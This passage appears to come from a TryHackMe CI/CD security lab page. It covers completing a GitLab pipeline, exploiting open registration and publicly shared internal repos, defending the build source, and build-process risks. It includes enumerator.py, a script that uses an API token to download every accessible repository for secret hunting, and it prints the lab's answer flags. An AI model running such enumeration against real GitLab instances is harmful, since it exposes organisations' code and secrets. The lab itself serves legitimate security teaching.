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" width="256" height="75" class="img_ev3q"></p>
<p>Once there, you should see that your pipeline has kicked off! Click on the pipeline to view which job it is currently performing and the output thereof:</p>
<p><img decoding="async" loading="lazy" alt="current job running screen" src="/TryHackMe-CN/en/assets/images/image_20251116-101615-1eb15866828fc48792368f6fd08eb06c.png" width="1010" height="166" class="img_ev3q"></p>
<p>You can also click on the pipeline to view its progress:</p>
<p><img decoding="async" loading="lazy" alt="progress status for pipeline" src="/TryHackMe-CN/en/assets/images/image_20251116-101630-388999e321f9735a8adaf3f85d6b2fb2.png" width="1004" height="591" class="img_ev3q"></p>
<p>Once completed, your application will have been deployed! You can verify this by navigating to <a href="http://127.0.0.1:8081/" target="_blank" rel="noopener noreferrer" class="">http://127.0.0.1:8081/</a>, and you should be met by the web application homepage.</p>
<p><img decoding="async" loading="lazy" alt="web application homepage" src="/TryHackMe-CN/en/assets/images/image_20251117-101705-79dd61f4661e468d1cc1b17643375dad.png" width="535" height="792" class="img_ev3q"></p>
<p>Congrats! You have created your very own CI/CD pipeline and build process! Feel free to play around more with the CI/CD pipeline configuration and your runner!</p>
<p><strong>Note</strong>: If you wish to remove the website, you can use <code>sudo su gitlab-runner</code> followed by <code>screen -r</code> to connect to the screen that is hosting your website. From here, you will be able to terminate the website.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the name of the build agent that can be used with Gitlab? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Gitlab Runner</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the value of the flag you receive once authenticated to Timekeep? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{Welcome.to.CICD.Pipelines}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-5-securing-the-build-source">Task 5 Securing the Build Source<a href="#task-5-securing-the-build-source" class="hash-link" aria-label="Direct link to Task 5 Securing the Build Source" title="Direct link to Task 5 Securing the Build Source" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="source-code-security">Source Code Security<a href="#source-code-security" class="hash-link" aria-label="Direct link to Source Code Security" title="Direct link to Source Code Security" translate="no">​</a></h3>
<p>As mentioned in the Introduction to Pipeline Automation and Source Code Security rooms, the first step to securing the pipeline and the build is to secure the source. In the event that a threat actor can compromise the source of our build, they are in a position to compromise the build itself. We want to protect our source code from the following two main issues:</p>
<ul>
<li class=""><strong>Unauthorised Tampering</strong> - This is the simplest issue of the two. Only authorised users should be able to make changes to the source code. This means that we want to control who has the ability to push new code to our repo.</li>
<li class=""><strong>Unauthorised Disclosure</strong> - This is a bit more tricky. Depending on the application, the source code itself might be considered sensitive. For example, Microsoft would not like to disclose the source code of Word since that is their intellectual property. In cases where the source code is sensitive, we must ensure we do not intentionally disclose it. This issue is a lot more common to find.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="confusion-of-responsibilities">Confusion of responsibilities<a href="#confusion-of-responsibilities" class="hash-link" aria-label="Direct link to Confusion of responsibilities" title="Direct link to Confusion of responsibilities" translate="no">​</a></h3>
<p>Let&#x27;s take a look at exploiting an insecure build source. A common mistake made in large organisations is believing that the perimeter is a sufficient security boundary. Although the perimeter plays a role, it should not be seen as the only boundary. Granular access control on the internal network should be implemented as well. This false belief can lead to interesting misconfigurations. Let&#x27;s take a look at a practical example.</p>
<p>Some organisations are incredibly large and have multiple teams and business units responsible for different things. If we take an organisation such as a bank, many different teams and units work together to run the bank. Furthermore, in large organisations like this, it isn&#x27;t as simple as just saying that we have an &quot;IT&quot; business unit, as there may be several teams working on many different IT and development projects within the bank, using a wide range of coding languages, CI/CD pipelines, and build frameworks. Such large organisations may choose to host their source code internally since much of that development may be intellectual property (IP). While we would hope that access to the various source code repos would be managed granularly, mistakes do creep in.</p>
<p>One such mistake is that organisations can leave registration for their Gitlab instance open. Not open to the internet (although this has also happened before), but open to any user on their internal network to register a profile. This was simulated in the previous task by allowing you to register your own Gitlab profile.</p>
<p>Some would consider this not to be a direct risk, but let&#x27;s look at how the attack surface grows. Our example bank organisation might have 10,000 employees, of which 2000 may be working as developers and need access to Gitlab. In essence, our attack surface has grown by 500%! If a single employee of our bank is compromised, an attacker would have the ability to register a profile and exfiltrate any publicly shared repos.</p>
<p>This is the second misconfiguration that comes into play. Developers of our bank may believe that because the Gitlab instance is only accessible internally, it is okay to configure repos to be shared publicly. This means that any user who has a valid Gitlab account will be able to view the repo. While they may perhaps not be able to alter the code, remember, in this example, the code itself is seen as the IP of the bank. This confusion between who is responsible for securing the source code can lead to sensitive information being disclosed to the threat actor. Let&#x27;s take a look at how this can be exploited!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploiting-a-vulnerable-build-source">Exploiting a vulnerable build source<a href="#exploiting-a-vulnerable-build-source" class="hash-link" aria-label="Direct link to Exploiting a vulnerable build source" title="Direct link to Exploiting a vulnerable build source" translate="no">​</a></h3>
<p>You have already registered a profile on the GitLab instance. While you can use manual enumeration to find sensitive information in repos, where you are on a red team, you will need to automate this process to ensure stealth and efficiency. We will not be teaching both in this task for obvious reasons, so let&#x27;s look at how we can make the process efficient. To efficiently enumerate publicly visible repos, we will make use of the Gitlab API and a Python script as follows:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">enumerator.py</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> gitlab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> uuid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Create a Gitlab connection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gl </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> gitlab</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Gitlab</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;http://gitlab.tryhackme.loc/&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> private_token</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;REPLACE_ME&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gl</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">auth</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Get all Gitlab projects</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">projects </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> gl</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">projects</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">list</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">all</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Enumerate through all projects and try to download a copy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> project </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> projects</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Downloading project: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">project</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">#Generate a UID to attach to the project, to allow us to download all versions of projects with the same name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UID </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uuid</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">uuid4</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        repo_download </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> project</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">repository_archive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">format</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;zip&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">project</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;_&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">&quot;.zip&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;wb&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> output_file</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            output_file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">repo_download</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">except</span><span class="token plain"> Exception </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># Based on permissions, we may not be able to download the project</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Error with this download&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">pass</span><br></span></code></pre></div></div>
<p><strong>Note</strong>: Make sure to install the Gitlab pip package using <code>pip3 install python-gitlab==3.15.0</code>.</p>
<p>As mentioned before, the script provided is not stealthy. Rather than first determining which repos are publicly available, it recovers the entire list of all repos and attempts to download each of them. This shows an example of how a threat actor can quickly and easily recover all publicly available repos. Feel free to play around with the script to introduce stealth.</p>
<p>As you will see, line 5 of the script requires a Gitlab authentication token. Gitlab does not allow for its API to be interfaced with using credentials, as this is deemed insecure. Therefore, to use the script, we will first have to generate an API token for our account. Authenticate to the Gitlab server and perform the following steps:</p>
<ol>
<li class="">
<p>Click on your profile icon and select Preferences:</p>
<p><img decoding="async" loading="lazy" alt="preferences menu" src="/TryHackMe-CN/en/assets/images/image_20251126-102651-ba1612e23566d2205c71b15895d97c0b.png" width="508" height="702" class="img_ev3q"></p>
</li>
<li class="">
<p>Click on Access Tokens:</p>
<p><img decoding="async" loading="lazy" alt="access tokens menu" src="/TryHackMe-CN/en/assets/images/image_20251127-102722-e23a45a85f78944d5ae50c6fd97e5dd4.png" width="518" height="1054" class="img_ev3q"></p>
</li>
<li class="">
<p>Enter a name for a new API token and select the api, read_api, and read_repository scopes:</p>
<p><img decoding="async" loading="lazy" alt="api initiation and scope selection" src="/TryHackMe-CN/en/assets/images/image_20251127-102755-cd8855acf25fdd5c53c63df4996a0edc.png" width="867" height="657" class="img_ev3q"></p>
</li>
<li class="">
<p>Click Create personal access token, reveal, and copy your access token to a safe location:</p>
<p><img decoding="async" loading="lazy" alt="create personal access token" src="/TryHackMe-CN/en/assets/images/image_20251128-102821-c58207d03b5186e964b519bb127ca15c.png" width="1279" height="211" class="img_ev3q"></p>
</li>
<li class="">
<p>Add the token to the script and execute it to download all repos:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">thm</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">$ python3.9 enumerator.py </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Downloading project: Basic Build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3609db7f-0d07-440c-bdc6-1f78cb283f6a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Downloading project: Mobile App</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">836fe1fa-0fc2-4917-b1c1-61badef3b711</span><br></span></code></pre></div></div>
</li>
</ol>
<p>Now you have successfully downloaded all of the publicly available repos! At this point, there are several ways you can look for sensitive information. The easiest would be to extract all repos and run a grep for specific keywords, such as <code>secret</code>. Make sure to read through the available repos to find the hidden secret flag! Note: don&#x27;t change the name of the script (enumerator.py) as it will throw errors!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="securing-the-build-source">Securing the Build Source<a href="#securing-the-build-source" class="hash-link" aria-label="Direct link to Securing the Build Source" title="Direct link to Securing the Build Source" translate="no">​</a></h3>
<p>Granular access control is crucial to managing repositories and the GitLab platform. It involves defining specific permissions and restrictions for different users or groups, ensuring that only authorised individuals have the appropriate level of access to sensitive resources. This helps maintain security, confidentiality, and effective collaboration within a development environment.</p>
<p>In GitLab, group-based access control is a powerful mechanism that simplifies permissions management across multiple repositories and projects. Here&#x27;s how it works:</p>
<ol>
<li class=""><strong>Group-Based Access Control</strong>: GitLab allows you to organise projects into groups. Instead of managing access for each project separately, you can set permissions at the group level. This means that the same access rules apply to all projects within the group, making it easier to maintain consistent security policies. For example, you can create a group for the development team and define permissions, such as who can view, edit, or contribute to projects within that group. This approach streamlines access management and reduces the chances of errors or oversights when configuring permissions for individual repositories.</li>
<li class=""><strong>Access Levels</strong> : GitLab offers different access levels, such as Guest, Reporter, Developer, Maintainer, and Owner. Each level comes with specific capabilities and permissions. Assigning the appropriate access level to each user or group ensures they have the necessary privileges without granting unnecessary permissions.</li>
<li class=""><strong>Sensitive Information Protection</strong> : One critical consideration is preventing the accidental exposure of sensitive information. GitLab provides features to help with this:<!-- -->
<ol>
<li class=""><strong>GitLab&#x27;s .gitignore</strong> : This file specifies which files or directories should be excluded from version control. It&#x27;s crucial for preventing sensitive data like passwords, API keys, and configuration files from being committed to repositories.</li>
<li class=""><strong>Environment Variables</strong> : GitLab allows you to define and manage environment variables securely, separate from the source code. This is especially useful for storing sensitive data needed during the CI/CD process without exposing it in the repository.</li>
<li class=""><strong>Branch Protection</strong> : Branches, like master or main, can be protected to prevent direct pushes, ensuring that changes go through code review and automated testing before merging.</li>
</ol>
</li>
</ol>
<p>Remember, maintaining the security of both the repositories and the GitLab instance itself requires constant vigilance and best practices:</p>
<ul>
<li class="">Review and update access permissions regularly as team members change roles or leave the organisation.</li>
<li class="">Implement two-factor authentication (2FA) to add an extra layer of security to user accounts.</li>
<li class="">Monitor audit logs to track who has accessed or modified repositories and projects.</li>
<li class="">Regularly scan repositories for sensitive information using tools designed for this purpose.</li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Which file specifies which directories and files should be excluded for version control? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.gitignore</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What can you protect to ensure direct pushes and vulnerable code changes are avoided? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Branches</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What issue does lack of access control and unauthorised code changes lead to? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">unauthorised tampering</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What is the API key stored within the Mobile application that can be accessed by any Gitlab user? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{You.Found.The.API.Key}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-6-securing-the-build-process">Task 6 Securing the Build Process<a href="#task-6-securing-the-build-process" class="hash-link" aria-label="Direct link to Task 6 Securing the Build Process" title="Direct link to Task 6 Securing the Build Process" translate="no">​</a></h2>
<p>Now that we have paid attention to protecting the build source of our pipeline, next on our journey is ensuring that the build process itself does not have misconfigurations that can lead to compromise.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="managing-dependencies">Managing Dependencies<a href="#managing-dependencies" class="hash-link" aria-label="Direct link to Managing Dependencies" title="Direct link to Managing Dependencies" translate="no">​</a></h3>
<p>The first step to securing the build process is to secure the dependencies of the build. As our pipeline kicks off, it will start by compiling our source code into the final build. However, our source code may depend on external libraries and SDKs for its functionality. Thus, during this compilation process, the build pipeline will gather these dependencies to perform the build. There are two main concerns for our build process when it comes to dependencies:</p>
<ul>
<li class="">Supply Chain Attacks - If a threat actor can take over one of these dependencies, they would be able to inject malicious code into the build</li>
<li class="">Dependency Confusion - If an internally developed dependency is used, an attacker could attempt a dependency confusion attack to inject code into the build process itself.</li>
</ul>
<p>Both of these attacks have already been covered in the <a href="http://tryhackme.com/jr/dependencymanagement" target="_blank" rel="noopener noreferrer" class="">Dependency Management room</a> if you want to learn more and practically exploit these attacks. In this task, we will focus on a misconfiguration within the build process itself.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="knowing-when-to-start-the-build">Knowing When to Start the Build<a href="#knowing-when-to-start-the-build" class="hash-link" aria-label="Direct link to Knowing When to Start the Build" title="Direct link to Knowing When to Start the Build" translate="no">​</a></h3>
<p>A big issue with pipelines and the build process is that, in a nutshell, whether you like to hear it or not, it is remote code execution as a feature. Once a pipeline kicks off, the build server communicates to one of the build agents to perform the build, which includes reading the commands that have to be executed from the CI file and performing them. While this creates automation, it also creates the risk that if an attacker can alter what is being built or when, they might be able to leverage this code execution to compromise systems. Therefore, we need to pay special attention to the following:</p>
<ul>
<li class="">What actions do we allow to kick off the build process?</li>
<li class="">Who has permission to perform these actions to kick off the build process?</li>
<li class="">Where will the build process occur?</li>
</ul>
<p>The answers to these questions can help you determine the attack surface of your pipeline. While, in most cases, a bad answer to one of these questions won&#x27;t compromise either the build or the pipeline, there are some toxic combinations that you must be aware of. Let&#x27;s take a bit of a closer look at these three questions.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-actions-start-the-build-process">What actions start the build process<a href="#what-actions-start-the-build-process" class="hash-link" aria-label="Direct link to What actions start the build process" title="Direct link to What actions start the build process" translate="no">​</a></h4>
